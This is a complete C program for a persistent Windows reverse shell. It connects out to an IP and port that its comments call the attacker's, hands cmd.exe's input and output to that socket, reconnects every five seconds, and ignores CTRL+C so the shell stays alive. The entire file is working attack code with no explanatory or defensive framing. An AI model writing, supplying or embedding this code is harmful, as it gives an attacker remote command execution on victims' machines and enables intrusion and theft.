#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// Control handler that intercepts CTRL+C and similar events
BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
    switch(dwCtrlType) {
        case CTRL_C_EVENT:
            // Ignore CTRL+C so that the shell doesn't die.
            printf("[*] CTRL+C pressed, but ignoring it.\n");
            return TRUE;  // Returning TRUE indicates the event is handled.
        default:
            return FALSE;
    }
}

void error_exit(const char *msg) {
    printf("[ERROR] %s (code: %d)\n", msg, WSAGetLastError());
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    // Set the console control handler so CTRL+C won't kill our process.
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
        error_exit("Failed to set control handler");
    }

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        error_exit("WSAStartup failed");
    }

    while (1) { // Auto-reconnect loop
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET) {
            error_exit("Socket creation failed");
        }

        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(argv[1]); // Attacker's IP
        server.sin_port = htons(atoi(argv[2])); // Attacker's port

        // Attempt connection
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(5000); // Wait 5 seconds before retrying
            continue;
        }

        // Setup process I/O for cmd.exe
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        // Spawn the shell
        if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            closesocket(sock);
            error_exit("CreateProcess failed");
        }

        // Wait for the shell process to exit
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Clean up and attempt to reconnect after the shell exits
        closesocket(sock);
        Sleep(5000); // Retry connection after 5 seconds
    }

    WSACleanup();
    return 0;
}
